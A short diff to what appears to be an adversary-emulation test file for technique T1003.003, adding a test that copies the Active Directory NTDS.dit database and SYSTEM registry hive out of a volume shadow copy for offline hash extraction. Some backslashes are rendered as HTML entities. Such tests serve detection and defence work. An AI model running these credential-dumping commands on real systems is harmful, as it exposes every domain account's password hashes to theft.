@@ -54,6 +54,12 @@ T1003.003.md
 ## Atomic Test #1 - Create Volume Shadow Copy with vssadmin
 vssadmin.exe create shadow /for=C:
 
+## Atomic Test #2 - Copy NTDS.dit from Volume Shadow Copy
+
+copy &#92;&#92;?&#92;GLOBALROOT&#92;Device&#92;HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:&#92;Windows&#92;Temp\ntds.dit
+copy &#92;&#92;?&#92;GLOBALROOT&#92;Device&#92;HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:&#92;Windows&#92;Temp\VSC_SYSTEM_HIVE
+reg save HKLM\SYSTEM C:&#92;Windows&#92;Temp\SYSTEM_HIVE
+
 T1003.004.md
 T1003.005.md
 T1003.006.md
